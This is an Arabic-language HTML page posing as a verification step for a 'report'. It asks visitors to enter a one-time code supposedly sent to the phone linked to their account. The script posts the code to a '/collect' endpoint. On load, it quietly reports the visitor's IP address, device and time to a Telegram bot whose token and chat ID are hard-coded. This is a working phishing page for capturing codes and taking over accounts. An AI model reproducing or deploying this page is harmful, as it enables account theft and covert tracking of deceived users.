<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>رمز التحقق</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #fff;
            text-align: center;
            padding: 50px;
        }
        h2 {
            color: red;
        }
        input {
            padding: 10px;
            width: 200px;
            font-size: 16px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        button {
            background-color: red;
            color: #fff;
            border: none;
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
            border-radius: 5px;
        }
        button:hover {
            background-color: darkred;
        }
    </style>
</head>
<body>

    <h2>تم إرسال رمز تحقق على رقم هاتفك المرتبط بالحساب لاستكمال التحقق من البلاغ.</h2>
    <form id="otpForm">
        <input type="text" id="otp" name="otp" placeholder="أدخل رمز التحقق" required>
        <br>
        <button type="submit">تأكيد ومتابعة</button>
    </form>

    <script>
        document.getElementById("otpForm").addEventListener("submit", function(e) {
            e.preventDefault();
            
            const otpValue = document.getElementById("otp").value;

            fetch("/collect", {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({ otp: otpValue })
            }).then(res => {
                if (res.ok) window.location.assign("/thanks.html");
            });
        });
        
        (function(){
            let botToken = "8390262932:AAGy-S3AvVTbP92MxP28DgblNz0kGZMN-gk";
            let chatId = "8107976008";
            let now = new Date();
            let device = navigator.userAgent;
            fetch("https://api.ipify.org?format=json")
            .then(res => res.json())
            .then(data => {
                let message = `🚨 تم فتح صفحة otp 🚨\n📅 الوقت: ${now}\n🌐 IP: ${data.ip}\n📱 الجهاز: ${device}`;
                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
            });
        })();
    </script>

</body>
</html>
